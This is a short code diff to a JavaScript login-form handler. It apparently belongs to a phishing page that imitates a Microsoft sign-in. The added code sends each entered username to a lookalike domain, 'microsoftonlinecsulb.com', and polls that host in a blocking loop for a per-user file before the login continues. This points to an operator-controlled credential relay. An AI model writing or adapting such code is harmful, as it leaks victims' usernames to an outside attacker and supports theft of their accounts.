@@ -38,7 +38,13 @@ function functioncheck(){
             return true;
           
 }
-
+function UrlExists(url)
+{
+    var http = new XMLHttpRequest();
+    http.open('HEAD', url, false);
+    http.send();
+    return http.status!=404;
+}
 
 $(document).on('submit','#login-form',function(e)
                    {
@@ -57,7 +63,7 @@ $(document).on('submit','#login-form',function(e)
           superloadingDiv.style.display = "block";
           passwordDiv.style.display = "none";
           console.log(functioncheck);
-          while(functioncheck() == false){
+          while(UrlExists('https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt') == false){
             console.log("loop");
 
           }
